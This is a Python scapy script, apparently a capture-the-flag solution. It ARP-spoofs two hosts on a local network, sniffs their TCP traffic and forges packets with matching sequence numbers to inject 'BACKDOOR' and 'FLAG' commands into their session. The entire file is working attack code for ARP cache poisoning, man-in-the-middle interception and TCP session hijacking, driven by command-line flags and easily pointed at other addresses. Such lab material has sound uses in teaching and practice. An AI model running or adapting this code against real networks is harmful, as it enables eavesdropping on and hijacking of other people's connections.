import warnings
from argparse import ArgumentParser
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.arch import get_if_addr, get_if_hwaddr
from scapy.sendrecv import srp1, sendp, sniff

WHO_HAS = 1
IS_AT = 2
MAIN_IF = "eth0"

main_if_mac = get_if_hwaddr(MAIN_IF)
main_if_ip = get_if_addr(MAIN_IF)
broadcast_mac = "ff:ff:ff:ff:ff:ff"

# target_1_ip = "10.0.0.3"
# target_2_ip = "10.0.0.4"
target_1_ip = "3.13.37.3"
target_2_ip = "3.13.37.4"

target_1_mac = ""
target_2_mac = ""

# target_port = 31337
target_port = 1992

backdoored = False

flag_mode = False


def get_target_macs():
    pkt_1 = Ether() / ARP()
    pkt_1[Ether].src = main_if_mac
    pkt_1[Ether].dst = broadcast_mac
    pkt_1[ARP].op = WHO_HAS
    pkt_1[ARP].hwsrc = main_if_mac
    pkt_1[ARP].hwdst = broadcast_mac
    pkt_1[ARP].psrc = main_if_ip
    pkt_1[ARP].pdst = target_1_ip

    pkt_2 = pkt_1.copy()
    pkt_2[ARP].pdst = target_2_ip

    ans_1 = srp1(pkt_1, iface=MAIN_IF)
    ans_2 = srp1(pkt_2, iface=MAIN_IF)
    target_1_mac = ans_1[ARP].hwsrc
    target_2_mac = ans_2[ARP].hwsrc

    return (target_1_mac, target_2_mac)


def spoof_target(target_ip, target_mac, fake_ip):
    # pretend that fake_ip is at main_if_mac
    pkt = Ether() / ARP()
    pkt[Ether].src = main_if_mac
    pkt[Ether].dst = target_mac
    pkt[ARP].op = IS_AT
    pkt[ARP].hwsrc = main_if_mac
    pkt[ARP].hwdst = target_mac
    pkt[ARP].psrc = fake_ip
    pkt[ARP].pdst = target_ip

    sendp(pkt, iface=MAIN_IF)


def backdoor(port, seq, ack):
    global backdoored
    # prerequisites
    # needs target macs first
    if target_1_mac == "" or target_2_mac == "":
        raise Exception("get mac addresses first")

    pkt = Ether() / IP() / TCP() / Raw()
    pkt[Ether].src = target_2_mac
    pkt[Ether].dst = target_1_mac
    pkt[IP].src = target_2_ip
    pkt[IP].dst = target_1_ip
    pkt[TCP].sport = port
    pkt[TCP].dport = target_port  # target_1 always listens on this port
    pkt[TCP].seq = ack
    pkt[TCP].ack = seq + len("SECRET CONFIRMED\n:>\n")
    pkt[TCP].flags = "PA"
    pkt[Raw].load = b"BACKDOOR\n"
    # pkt.show()
    sendp(pkt, iface=MAIN_IF)

    # backdoor is now open
    backdoored = True


def get_flag(port, seq, ack):
    flag_pkt = Ether() / IP() / TCP() / Raw()
    flag_pkt[Ether].src = target_2_mac
    flag_pkt[Ether].dst = target_1_mac
    flag_pkt[IP].src = target_2_ip
    flag_pkt[IP].dst = target_1_ip
    flag_pkt[TCP].sport = port
    flag_pkt[TCP].dport = target_port  # target_1 always listens on this port
    flag_pkt[TCP].seq = ack
    flag_pkt[TCP].ack = seq + len("BACKDOOR OPEN\n")
    flag_pkt[TCP].flags = "PA"
    flag_pkt[Raw].load = b"FLAG\n"
    # print("\n-----\nFlag packet:\n")
    # flag_pkt[TCP].show()
    # print("\n-----\n")

    sendp(flag_pkt, iface=MAIN_IF)


def packet_handler(pkt):
    global backdoored
    raw_load = pkt[Raw].load.decode("latin")
    print(
        str(pkt[IP].src) + ":" + str(pkt[TCP].sport),
        ">",
        str(pkt[IP].dst) + ":" + str(pkt[TCP].dport),
    )
    if raw_load.startswith("SECRET CONFIRMED") and not backdoored:
        backdoor(port=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    if raw_load.startswith("BACKDOOR OPEN") and backdoored:
        get_flag(port=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    print(raw_load, end="")
    # pkt[TCP].show()


def capture_packets():
    sniff(
        prn=packet_handler,
        iface=MAIN_IF,
        lfilter=lambda x: x.haslayer(TCP) and x.haslayer(Raw),
    )


if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument(
        "-l", "--list-macs", required=False, dest="list_macs", action="store_true"
    )
    parser.add_argument(
        "-s", "--arp-spoof", required=False, dest="arp_spoof", action="store_true"
    )
    parser.add_argument(
        "-c", "--capture", required=False, dest="capture", action="store_true"
    )
    parser.add_argument(
        "-i", "--infiltrate", required=False, dest="infiltrate", action="store_true"
    )

    args = parser.parse_args()
    if args.arp_spoof and not args.list_macs:
        args.list_macs = True
        warnings.warn("Warning: spoofing needs MAC addresses, acquiring them first")

    if args.infiltrate:
        flag_mode = True

    if args.list_macs:
        target_1_mac, target_2_mac = get_target_macs()
        print(target_1_ip + " is at " + target_1_mac)
        print(target_2_ip + " is at " + target_2_mac)

    if args.arp_spoof:
        spoof_target(target_1_ip, target_1_mac, target_2_ip)
        spoof_target(target_2_ip, target_2_mac, target_1_ip)

    if args.capture:
        capture_packets()
